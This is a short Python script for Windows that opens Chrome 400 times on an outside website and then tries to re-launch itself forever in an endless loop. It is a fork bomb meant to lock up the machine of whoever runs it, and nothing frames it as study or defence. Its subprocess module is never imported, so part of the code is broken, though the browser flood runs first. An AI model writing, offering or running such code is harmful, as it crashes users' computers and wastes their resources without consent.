import sys
import os
import time
import ctypes

user32 = ctypes.windll.user32

def hello():
    os.system("for /l %x in (1, 1, 400) do start ""C:\\\"Program Files\"\\Google\\Chrome\\Application\\chrome.exe https://www.dhscycle.com")
    time.sleep(5)
    
    while True:
        subprocess.Popen([sys.executable, __file__])

hello()